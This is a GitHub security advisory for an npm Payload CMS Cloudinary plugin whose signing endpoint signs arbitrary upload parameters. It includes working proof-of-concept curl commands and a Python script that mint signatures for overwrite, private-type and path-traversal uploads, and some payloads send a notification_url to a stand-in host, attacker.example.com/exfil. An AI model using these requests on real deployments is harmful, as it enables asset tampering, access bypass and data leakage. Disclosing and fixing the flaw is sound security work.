# [H] @jhb.software/payload-cloudinary-plugin: Arbitrary Cloudinary API Parameter Signing

## Summary
Severity: High
Advisory: GHSA-h5x8-xp6m-x6q4
CWE: CWE-347
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-h5x8-xp6m-x6q4
Type: github-advisory

## Affected
- npm: `@jhb.software/payload-cloudinary-plugin` — affected >=0.3.0 <0.4.0

## Details
## Arbitrary Cloudinary API Parameter Signing in @jhb.software/payload-cloudinary-plugin

### Summary

`@jhb.software/payload-cloudinary-plugin` v0.3.4 exposes a server-side signing endpoint (`POST /api/cloudinary-generate-signature`) that passes attacker-supplied `paramsToSign` directly to `cloudinary.utils.api_sign_request()` without any allowlist, key filtering, or policy enforcement. Any authenticated Payload user can obtain a cryptographically valid Cloudinary HMAC-SHA1 signature for arbitrary upload parameters — including `overwrite=true`, `type=private`, `notification_url`, and path-traversal folder values — enabling unauthorized asset replacement, access-control bypass, and potential SSRF within the configured Cloudinary account.

### Details

When `clientUploads: true` is configured, the plugin registers a signing handler at `cloudinary/src/index.ts:74-79`. The handler is implemented in `cloudinary/src/getGenerateSignature.ts`.

**Vulnerable code path (step by step):**

1. `cloudinary/src/index.ts:58` — `initClientUploads` registers the server upload handler.
2. `cloudinary/src/index.ts:68` — The Cloudinary API key is exposed to client handler props by design.
3. `cloudinary/src/index.ts:74-79` — The signing endpoint is mounted at `/cloudinary-generate-signature`.
4. `cloudinary/src/getGenerateSignature.ts:18` — The default access control checks only `!!req.user`, permitting any authenticated user.
5. `cloudinary/src/getGenerateSignature.ts:46` — The entire request body is parsed: `const body = await req.json?.()`.
6. `cloudinary/src/getGenerateSignature.ts:55` — **Vulnerable sink**: attacker-controlled `body.paramsToSign` is forwarded verbatim to the signing function.

```ts
// cloudinary/src/getGenerateSignature.ts:46-55
const body = await req.json?.()

if (!body?.paramsToSign) {
  return new Response(JSON.stringify({ error: 'No paramsToSign provided' }), ...)
}

// No allowlist, no key filtering, no folder/public_id/overwrite enforcement
const signature = cloudinary.utils.api_sign_request(body.paramsToSign, apiSecret)
```

There are **no** mitigations in place:
- No parameter key allowlist (attacker can include `overwrite`, `type`, `notification_url`, `invalidate`, etc.)
- No folder/public_id policy enforcement (the plugin's `folder` option from `index.ts` is never passed to `getGenerateSignature`)
- No timestamp freshness check
- No restriction on path traversal sequences in `folder` or `public_id`

Dynamic reproduction (Phase 2) confirmed all five attack scenarios with HTTP 200 and mathematically verified HMAC-SHA1 signatures:

| Case | paramsToSign | Impact |
|------|-------------|--------|
| CASE-2 | `folder=attacker-controlled, overwrite=true` | Overwrite any existing asset |
| CASE-3 | `type=private, public_id=admin-document` | Change asset visibility / bypass access control |
| CASE-4 | `notification_url=http://attacker.example.com/exfil` | SSRF / data exfiltration via Cloudinary webhook |
| CASE-5 | `folder=../../../../admin-assets, invalidate=true` | Path traversal + CDN cache invalidation |

Python-independent signature recalculation matched server responses in all 5/5 cases, proving the server computes a genuine HMAC-SHA1 over attacker-controlled input.

### PoC

**Prerequisites:**
- `@jhb.software/payload-cloudinary-plugin@0.3.4` deployed with `clientUploads: true`
- An authenticated Payload session (any privilege level)
- Knowledge of `CLOUDINARY_CLOUD_NAME` and the client-exposed API key (exposed by design at `index.ts:68`)

**Step 1 — Obtain a signature for arbitrary parameters (bash):**

```bash
TS=$(date +%s)

SIG=$(curl -s \
  -H "Authorization: Bearer <LOW_PRIV_TOKEN>" \
  -H "Content-Type: application/json" \
  -X POST "http://localhost:3000/api/cloudinary-generate-signature?collectionSlug=media" \
  --data "{\"paramsToSign\":{\"timestamp\":\"$TS\",\"folder\":\"attacker\",\"public_id\":\"overwrite-target\",\"overwrite\":\"true\"}}" \
  | jq -r .signature)

echo "Obtained signature: $SIG"
```

**Step 2 — Use the minted signature to upload directly to Cloudinary:**

```bash
curl -s -X POST "https://api.cloudinary.com/v1_1/$CLOUDINARY_CLOUD_NAME/auto/upload" \
  -F "file=@poc.txt" \
  -F "api_key=$CLOUDINARY_API_KEY" \
  -F "timestamp=$TS" \
  -F "folder=attacker" \
  -F "public_id=overwrite-target" \
  -F "overwrite=true" \
  -F "signature=$SIG"
```

**Expected result:** Cloudinary returns a successful upload JSON for `attacker/overwrite-target` — an asset path the plugin never intended to authorize.

**Automated PoC (Python):**

```bash
# Build and run the reproduction container
docker build -t vuln-002-cloudinary .
docker run -d --name vuln-002 -p 3000:3000 vuln-002-cloudinary

# Run all five attack scenarios
python3 poc.py --server http://127.0.0.1:3000
```

The script (`poc.py`) posts five distinct `paramsToSign` payloads and independently verifies each returned signature using `hashlib.sha1`. All five cases return HTTP 200 with a mathematically valid signature, confirming the vulnerability.

**Sample output (Phase 2 evidence):**

```
[SIGN] paramsToSign={"timestamp":"...","folder":"attacker-controlled","public_id":"overwrite-target","overwrite":"true"}
      => abc45ef5f0807bdef153074d2be3e713ea867168  (HTTP 200)

[SIGN] paramsToSign={"timestamp":"...","type":"private","public_id":"admin-document"}
      => 0d8102a5ff48953832b76a1f21d1c513af5940e1  (HTTP 200)

[SIGN] paramsToSign={"timestamp":"...","folder":"media","notification_url":"http://attacker.example.com/exfil"}
      => 72d954c67bd4a38d6a3931c64511f84143d24685  (HTTP 200)

[SIGN] paramsToSign={"timestamp":"...","folder":"../../../../admin-assets","public_id":"../../../sensitive","invalidate":"true"}
      => d44984e7af8fca306e59e00810c2623d8963e011  (HTTP 200)

Results: 5/5 cases confirmed — HTTP 200 + mathematically valid HMAC-SHA1 on every attacker-controlled paramsToSign
```

**Recommended fix:**

```diff
--- a/cloudinary/src/getGenerateSignature.ts
+++ b/cloudinary/src/getGenerateSignature.ts
@@ type Args = {
   apiSecret: string
+  folder?: string
 }
@@ export const getGenerateSignature =
-  ({ access = defaultAccess, apiSecret }: Args): PayloadHandler =>
+  ({ access = defaultAccess, apiSecret, folder }: Args): PayloadHandler =>
@@
-    const signature = cloudinary.utils.api_sign_request(body.paramsToSign, apiSecret)
+    const paramsToSign = body.paramsToSign as Record<string, unknown>
+    const allowedKeys = new Set(['timestamp', 'folder', 'public_id'])
+    if (
+      !paramsToSign ||
+      Object.keys(paramsToSign).some((key) => !allowedKeys.has(key)) ||
+      typeof paramsToSign.timestamp !== 'string'
+    ) {
+      throw new Forbidden()
+    }
+    if (folder && paramsToSign.folder !== folder.replace(/^\/|\/$/g, '')) {
+      throw new Forbidden()
+    }
+    if (
+      typeof paramsToSign.public_id === 'string' &&
+      (paramsToSign.public_id.includes('..') || paramsToSign.public_id.startsWith('/'))
+    ) {
+      throw new Forbidden()
+    }
+    const signature = cloudinary.utils.api_sign_request(paramsToSign, apiSecret)
```

### Impact

This is an **Improper Verification of Cryptographic Signature** vulnerability (CWE-347). The signing endpoint is intended to authorize legitimate client-side uploads, but because `paramsToSign` is never validated, it acts as an unrestricted signature oracle for any authenticated user.

**Who is impacted:** All deployments of `@jhb.software/payload-cloudinary-plugin` that set `clientUploads: true`. This is a non-default but officially recommended production configuration for Vercel deployments (documented in the plugin README).

**Concrete attack outcomes:**

- **Asset overwrite** (`overwrite=true`): attacker replaces any existing media asset in the Cloudinary account, enabling content tampering or defacement.
- **Access-control bypass** (`type=private`): attacker changes the delivery type of uploaded assets, potentially exposing or hiding content beyond what the application intends.
- **SSRF / data exfiltration** (`notification_url`): Cloudinary issues an HTTP callback to the attacker-controlled URL upon upload completion, leaking upload metadata and enabling server-side request forgery.
- **Path traversal** (`folder=../../../../...`, `invalidate=true`): attacker writes to or invalidates assets in arbitrary Cloudinary folders, including administrative paths outside the configured upload directory.

The Cloudinary API key is exposed to the client by the plugin itself (`index.ts:68`), so an attacker already holds three of the four required upload components (cloud name, API key, timestamp). The signing endpoint provides the missing fourth (signature), completing the attack chain with a single authenticated request.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM node:22-alpine

LABEL description="VULN-002 reproduction: arbitrary Cloudinary API parameter signing" \
      vuln="getGenerateSignature.ts:55 - body.paramsToSign signed without allowlist" \
      package="@jhb.software/payload-cloudinary-plugin@0.3.4"

WORKDIR /app

# Install exactly the cloudinary version declared in the plugin's package.json
RUN echo '{"name":"vuln-002-server","version":"1.0.0","private":true}' > package.json && \
    npm install cloudinary@2.10.0 --save --no-audit --no-fund

COPY server.js .

EXPOSE 3000

# Start the minimal reproduction server
CMD ["node", "server.js"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-002: Arbitrary Cloudinary API Parameter Signing
Package : @jhb.software/payload-cloudinary-plugin v0.3.4
File    : cloudinary/src/getGenerateSignature.ts:55
CWE     : CWE-347 — Improper Verification of Cryptographic Signature
CVSS    : 7.1 (High) AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L

Vulnerable sink (exact line from source):
    const signature = cloudinary.utils.api_sign_request(body.paramsToSign, apiSecret)

body.paramsToSign is passed directly with no allowlist, no key filtering, and no
folder/public_id/overwrite enforcement. Any authenticated user can obtain a valid
Cloudinary HMAC-SHA1 signature for arbitrary upload parameters.

Usage:
    python3 poc.py [--server http://127.0.0.1:3000]
"""

import argparse
import hashlib
import json
import sys
import time
import urllib.error
import urllib.request

# Must match API_SECRET in server.js
API_SECRET = "poc-fake-api-secret-12345"

# Simulates a low-privilege authenticated user session
AUTH_HEADER = "Bearer low-privilege-user-token"

GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
RESET = "\033[0m"


# ---------------------------------------------------------------------------
# Cloudinary signature algorithm — Python re-implementation of
#   cloudinary.utils.api_sign_request(params, api_secret)
# Algorithm: SHA-1( sorted_k=v_pairs + api_secret )
# ---------------------------------------------------------------------------
def cloudinary_sign(params: dict, api_secret: str) -> str:
    """Return the expected Cloudinary HMAC-SHA1 signature for params."""
    filtered = {k: v for k, v in params.items() if v not in (None, "")}
    sorted_pairs = sorted(filtered.items())
    param_str = "&".join(f"{k}={v}" for k, v in sorted_pairs)
    to_sign = param_str + api_secret
    return hashlib.sha1(to_sign.encode("utf-8")).hexdigest()


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
def post_sign(server: str, params: dict) -> tuple[int, dict]:
    """
    POST {"paramsToSign": params} to the signing endpoint.
    Returns (http_status, response_dict).
    Raises urllib.error.HTTPError for 4xx/5xx.
    """
    body = json.dumps({"paramsToSign": params}).encode("utf-8")
    req = urllib.request.Request(
        f"{server}/api/cloudinary-generate-signature?collectionSlug=media",
        data=body,
        headers={
            "Content-Type": "application/json",
            "Authorization": AUTH_HEADER,
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, json.loads(resp.read())


# ---------------------------------------------------------------------------
# Test runner
# ---------------------------------------------------------------------------
def run_case(server: str, label: str, params: dict) -> bool:
    """
    Execute one signing test case and verify:
      1. HTTP 200 is returned (endpoint did NOT reject the params).
      2. The returned signature is mathematically correct.
    Returns True if both conditions hold (vulnerability confirmed for this case).
    """
    print(f"\n  [{label}]")
    print(f"  paramsToSign : {json.dumps(params)}")

    try:
        status, data = post_sign(server, params)
    except urllib.error.HTTPError as exc:
        body = exc.read().decode(errors="replace")
        print(f"  HTTP {exc.code} — request rejected: {body}")
        print(f"  {RED}UNEXPECTED REJECTION{RESET} — allowlist may be present for this case")
        return False
    except Exception as exc:
        print(f"  Connection error: {exc}")
        return False

    sig_returned = data.get("signature", "")
    sig_expected = cloudinary_sign(params, API_SECRET)
    sig_match = sig_returned == sig_expected

    print(f"  HTTP status  : {status}")
    print(f"  Signature    : {sig_returned}")
    print(f"  Expected sig : {sig_expected}")
    print(f"  Sig valid    : {'YES — mathematically correct HMAC-SHA1' if sig_match else 'NO — mismatch'}")

    if status == 200 and sig_match:
        print(f"  {GREEN}CONFIRMED{RESET} — endpoint signed arbitrary params without rejection")
        return True
    else:
        print(f"  {RED}UNEXPECTED{RESET} — status={status}, sig_match={sig_match}")
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="VULN-002 PoC")
    parser.add_argument("--server", default="http://127.0.0.1:3000", help="Target server URL")
    args = parser.parse_args()
    server = args.server.rstrip("/")

    ts = str(int(time.time()))

    print("=" * 70)
    print("VULN-002 PoC — Arbitrary Cloudinary API Parameter Signing")
    print(f"Target  : {server}")
    print(f"Vuln    : getGenerateSignature.ts:55 — no paramsToSign allowlist")
    print(f"Auth    : {AUTH_HEADER!r}  (low-privilege user simulation)")
    print("=" * 70)

    # ------------------------------------------------------------------
    # Attack scenarios
    # ------------------------------------------------------------------
    # Each case passes paramsToSign that the plugin should REJECT but does NOT.
    # A correctly patched implementation would return 4xx for cases 2-5.
    # ------------------------------------------------------------------
    cases = [
        (
            "CASE-1: Legitimate params (baseline — should always succeed)",
            {"timestamp": ts, "folder": "media", "public_id": "user-upload"},
        ),
        (
            "CASE-2: Attacker-controlled folder + overwrite=true",
            {
                "timestamp": ts,
                "folder": "attacker-controlled",
                "public_id": "overwrite-target",
                "overwrite": "true",
            },
        ),
        (
            "CASE-3: type=private — changes upload visibility",
            {
                "timestamp": ts,
                "type": "private",
                "public_id": "admin-document",
            },
        ),
        (
            "CASE-4: notification_url — potential SSRF / data exfiltration",
            {
                "timestamp": ts,
                "folder": "media",
                "notification_url": "http://attacker.example.com/exfil",
            },
        ),
        (
            "CASE-5: folder path traversal + invalidate=true",
            {
                "timestamp": ts,
                "folder": "../../../../admin-assets",
                "public_id": "../../../sensitive",
                "invalidate": "true",
            },
        ),
    ]

    results = []
    for label, params in cases:
        results.append(run_case(server, label, params))

    passed = sum(results)
    total = len(results)

    print("\n" + "=" * 70)
    print(f"Results : {passed}/{total} cases confirmed")

    # Cases 1-5 all passing means the vulnerability is proven:
    # the endpoint signs ANY paramsToSign regardless of content.
    if all(results):
        print(f"\n{GREEN}VERDICT: PASS — VULN-002 CONFIRMED{RESET}")
        print(
            "All 5 attack scenarios returned HTTP 200 with a mathematically valid"
            " Cloudinary HMAC-SHA1 signature."
        )
        print(
            "The plugin endpoint signs arbitrary upload parameters without any"
            " allowlist, folder enforcement, or overwrite/type restriction."
        )
        print(
            "Impact: any authenticated Payload user can mint valid Cloudinary"
            " signatures for arbitrary parameters, enabling asset replacement,"
            " privacy changes, and potential SSRF via notification_url."
        )
        sys.exit(0)
    elif results[0]:
        failed = [cases[i][0] for i, r in enumerate(results) if not r]
        print(f"\n{YELLOW}VERDICT: PARTIAL — baseline succeeded but some cases failed{RESET}")
        print(f"Failed cases: {failed}")
        sys.exit(2)
    else:
        print(f"\n{RED}VERDICT: FAIL — server not reachable or baseline request failed{RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/jhb-software/payload-plugins/security/advisories/GHSA-h5x8-xp6m-x6q4
- https://github.com/jhb-software/payload-plugins
